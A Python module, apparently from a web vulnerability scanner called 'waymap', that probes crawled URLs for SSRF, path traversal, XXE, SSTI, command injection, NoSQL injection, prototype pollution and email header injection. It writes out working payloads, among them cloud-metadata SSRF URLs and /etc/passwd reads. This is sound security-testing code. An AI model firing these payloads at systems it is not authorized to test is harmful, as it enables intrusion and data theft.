"""Advanced injection checks (SSRF, XXE, traversal, HPP, etc.)."""

import random
import re
from typing import Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from lib.core.config import get_config
from lib.recon.common import get_domain, now_iso, request_url, save_and_report
from lib.ui import print_header, print_status

config = get_config()

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..\\..\\..\\..\\windows\\win.ini",
]

RFI_PAYLOADS = [
    "https://example.com",
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "${{7*7}}",
    "${7*7}",
]

RCE_PAYLOADS = [
    ";echo {marker};",
    "|echo {marker}|",
    "& echo {marker} &",
]

EMAIL_PARAM_HINTS = {"email", "to", "cc", "bcc", "subject", "contact"}
FILE_PARAM_HINTS = {"file", "filename", "download", "attachment"}
PROTO_POLLUTION_PAYLOAD = "__proto__[waymap]=polluted"


def _replace_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urlencode(qs, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))


def _response_has_keywords(text: str, keywords: List[str]) -> bool:
    lowered = text.lower() if text else ""
    return any(keyword in lowered for keyword in keywords)


def _detect_ssrf(domain: str, url: str, params: List[str], limit: int = 2) -> None:
    keywords = ["ami-id", "instance-id", "meta-data", "root:x:0:0", "localhost"]
    for param in params[:limit]:
        for payload in SSRF_PAYLOADS:
            test_url = _replace_param(url, param, payload)
            resp = request_url(test_url)
            if not resp:
                continue
            if _response_has_keywords(resp.text, keywords):
                scan_key = "ssrf_cloud_metadata" if "169.254" in payload else "ssrf"
                save_and_report(
                    domain,
                    scan_key,
                    {
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "timestamp": now_iso(),
                    },
                    unique_keys=["url", "parameter", "payload"],
                )


def _detect_lfi_to_rce(domain: str, url: str, params: List[str]) -> None:
    ua_marker = "WAYMAP_LFI_RCE"
    payloads = ["/proc/self/environ", "..%2f..%2f..%2f..%2fproc/self/environ"]
    for param in params[:1]:
        for payload in payloads:
            test_url = _replace_param(url, param, payload)
            resp = request_url(test_url, headers={"User-Agent": ua_marker})
            if resp and ua_marker in (resp.text or ""):
                save_and_report(
                    domain,
                    "lfi_to_rce_chains",
                    {
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "timestamp": now_iso(),
                    },
                    unique_keys=["url", "parameter", "payload"],
                )


def _detect_nosql_injection(domain: str, url: str, params: List[str]) -> None:
    baseline = request_url(url)
    base_len = len(baseline.text) if baseline else 0
    payload = "{\"$ne\":null}"
    if base_len == 0:
        return
    for param in params[:2]:
        test_url = _replace_param(url, param, payload)
        resp = request_url(test_url)
        if resp and abs(len(resp.text) - base_len) > 80:
            save_and_report(
                domain,
                "nosql_injection",
                {
                    "url": test_url,
                    "parameter": param,
                    "payload": payload,
                    "timestamp": now_iso(),
                },
                unique_keys=["url", "parameter", "payload"],
            )


def _detect_prototype_pollution(domain: str, url: str, params: List[str]) -> None:
    for param in params[:1]:
        test_url = _replace_param(url, param, PROTO_POLLUTION_PAYLOAD)
        resp = request_url(test_url)
        if resp and "polluted" in (resp.text or ""):
            save_and_report(
                domain,
                "prototype_pollution",
                {
                    "url": test_url,
                    "parameter": param,
                    "payload": PROTO_POLLUTION_PAYLOAD,
                    "timestamp": now_iso(),
                },
                unique_keys=["url", "parameter", "payload"],
            )


def _detect_email_header_injection(domain: str, url: str, params: List[str]) -> None:
    payload = "test@example.com%0d%0aBcc:waymap@example.com"
    for param in params:
        if param.lower() not in EMAIL_PARAM_HINTS:
            continue
        test_url = _replace_param(url, param, payload)
        resp = request_url(test_url)
        if not resp:
            continue
        body = resp.text or ""
        headers_str = "\n".join([f"{k}: {v}" for k, v in resp.headers.items()])
        if "waymap@example.com" in body or "Bcc" in headers_str:
            record = {
                "url": test_url,
                "parameter": param,
                "payload": payload,
                "timestamp": now_iso(),
            }
            save_and_report(
                domain,
                "email_header_injection",
                record,
                unique_keys=["url", "parameter", "payload"],
            )
            save_and_report(
                domain,
                "smtp_injection",
                record,
                unique_keys=["url", "parameter", "payload"],
            )


def _detect_reflected_file_download(domain: str, url: str, params: List[str]) -> None:
    for param in params:
        if param.lower() not in FILE_PARAM_HINTS:
            continue
        test_url = _replace_param(url, param, "waymap.txt")
        resp = request_url(test_url)
        if not resp:
            continue
        cd = resp.headers.get("Content-Disposition") or resp.headers.get("content-disposition")
        if cd and "waymap.txt" in cd:
            save_and_report(
                domain,
                "reflected_file_download",
                {
                    "url": test_url,
                    "parameter": param,
                    "timestamp": now_iso(),
                    "content_disposition": cd,
                },
                unique_keys=["url", "parameter", "content_disposition"],
            )


def _detect_xxe(domain: str, url: str) -> None:
    if "xml" not in url.lower():
        return
    payload = """<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"""
    resp = request_url(url, method="POST", headers={"Content-Type": "application/xml"}, data=payload)
    if resp and _response_has_keywords(resp.text, ["root:x:0:0", "daemon:", "/bin/bash"]):
        save_and_report(
            domain,
            "xxe",
            {
                "url": url,
                "timestamp": now_iso(),
                "status": str(resp.status_code),
            },
            unique_keys=["url", "status"],
        )


def _detect_http_parameter_pollution(domain: str, url: str, params: List[str]) -> None:
    baseline = request_url(url)
    baseline_len = len(baseline.text) if baseline else 0
    if baseline_len == 0:
        return
    for param in params[:2]:
        polluted = _replace_param(url, param, "test1,test2")
        resp = request_url(polluted)
        if resp and abs(len(resp.text) - baseline_len) > 50:
            save_and_report(
                domain,
                "http_parameter_pollution",
                {
                    "url": polluted,
                    "parameter": param,
                    "timestamp": now_iso(),
                    "delta": abs(len(resp.text) - baseline_len),
                },
                unique_keys=["url", "parameter"],
            )


def _detect_method_tampering(domain: str, base_url: str) -> None:
    resp = request_url(base_url, method="OPTIONS")
    if not resp:
        return
    allow = resp.headers.get("Allow") or resp.headers.get("allow")
    if allow:
        methods = [m.strip().upper() for m in allow.split(",")]
        save_and_report(
            domain,
            "http_method_tampering",
            {
                "url": base_url,
                "timestamp": now_iso(),
                "allow": methods,
            },
            unique_keys=["url", "allow"],
        )
        if any(m in {"PUT", "DELETE", "TRACE", "PROPFIND"} for m in methods):
            save_and_report(
                domain,
                "http_put_upload",
                {
                    "url": base_url,
                    "timestamp": now_iso(),
                    "allow": methods,
                },
                unique_keys=["url", "allow"],
            )
    dav = resp.headers.get("DAV") or resp.headers.get("dav")
    if dav:
        save_and_report(
            domain,
            "webdav_checks",
            {
                "url": base_url,
                "timestamp": now_iso(),
                "dav": dav,
            },
            unique_keys=["url", "dav"],
        )


def _detect_path_traversal(domain: str, url: str, params: List[str]) -> None:
    for param in params[:2]:
        for payload in PATH_TRAVERSAL_PAYLOADS:
            test_url = _replace_param(url, param, payload)
            resp = request_url(test_url)
            if resp and _response_has_keywords(resp.text, ["root:x:0:0", "[boot loader]"]):
                save_and_report(
                    domain,
                    "path_traversal",
                    {
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "timestamp": now_iso(),
                    },
                    unique_keys=["url", "parameter", "payload"],
                )


def _detect_rfi(domain: str, url: str, params: List[str]) -> None:
    for param in params[:1]:
        payload = random.choice(RFI_PAYLOADS)
        test_url = _replace_param(url, param, payload)
        resp = request_url(test_url)
        if resp and "Example Domain" in (resp.text or ""):
            save_and_report(
                domain,
                "rfi",
                {
                    "url": test_url,
                    "parameter": param,
                    "payload": payload,
                    "timestamp": now_iso(),
                },
                unique_keys=["url", "parameter", "payload"],
            )


def _detect_ssti(domain: str, url: str, params: List[str]) -> None:
    for param in params[:2]:
        for payload in SSTI_PAYLOADS:
            test_url = _replace_param(url, param, payload)
            resp = request_url(test_url)
            if resp and "49" in (resp.text or ""):
                save_and_report(
                    domain,
                    "ssti_advanced",
                    {
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "timestamp": now_iso(),
                    },
                    unique_keys=["url", "parameter", "payload"],
                )


def _detect_rce(domain: str, url: str, params: List[str]) -> None:
    marker = f"WAYMAP_RCE_ADV_{random.randint(1000, 9999)}"
    for param in params[:1]:
        for payload in RCE_PAYLOADS:
            test_url = _replace_param(url, param, payload.format(marker=marker))
            resp = request_url(test_url)
            if resp and marker in (resp.text or ""):
                save_and_report(
                    domain,
                    "rce_advanced",
                    {
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "timestamp": now_iso(),
                    },
                    unique_keys=["url", "parameter", "payload"],
                )


def perform_injection_advanced_scan(
    crawled_urls: List[str],
    thread_count: int = 1,
    no_prompt: bool = False,
    verbose: bool = False,
) -> None:
    if not crawled_urls:
        print_status("No URLs to scan", "warning")
        return

    print_header("Advanced Injection Scan", color="cyan")

    base_url = crawled_urls[0]
    domain = get_domain(base_url)

    _detect_method_tampering(domain, base_url)

    for url in crawled_urls:
        parsed = urlparse(url)
        params = list(parse_qs(parsed.query, keep_blank_values=True).keys())
        if not params:
            continue

        _detect_http_parameter_pollution(domain, url, params)
        _detect_ssrf(domain, url, params)
        _detect_path_traversal(domain, url, params)
        _detect_rfi(domain, url, params)
        _detect_ssti(domain, url, params)
        _detect_rce(domain, url, params)
        _detect_lfi_to_rce(domain, url, params)
        _detect_nosql_injection(domain, url, params)
        _detect_prototype_pollution(domain, url, params)
        _detect_email_header_injection(domain, url, params)
        _detect_reflected_file_download(domain, url, params)

    _detect_xxe(domain, base_url)

    print_status("Advanced injection scan completed", "info")
